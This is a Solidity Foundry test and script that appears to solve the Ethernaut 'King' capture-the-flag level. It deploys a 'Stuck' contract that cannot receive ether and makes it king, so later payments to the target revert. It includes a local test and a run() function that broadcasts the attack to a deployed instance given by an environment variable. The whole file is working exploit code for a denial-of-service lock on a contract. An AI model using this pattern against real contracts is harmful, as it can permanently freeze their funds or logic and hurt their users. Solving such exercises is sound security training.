// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "./Instance.sol";

contract Stuck {
    address payable private _to;

    constructor(address to) public payable {
        payable(to).call{value: 0.002 ether}("");
    }
}

contract Clear is Test {
    King private _instance;
    address payable private _player;

    function testLocal() external {
        _instance = new King{value: 0.001 ether}();
        _player = payable(vm.addr(1));
        vm.deal(_player, 10 ether);

        vm.startPrank(_player);
        new Stuck{value: 0.002 ether}(address(_instance));
        vm.stopPrank();

        vm.expectRevert();
        payable(_instance).call{value: 0.005 ether}("");
    }

    function run() external {
        _instance = King(payable(vm.envAddress("KING")));

        vm.startBroadcast();
        new Stuck{value: 0.002 ether}(address(_instance));
        vm.stopBroadcast();

        vm.expectRevert();
        payable(_instance).call{value: 0.005 ether}("");
    }
}
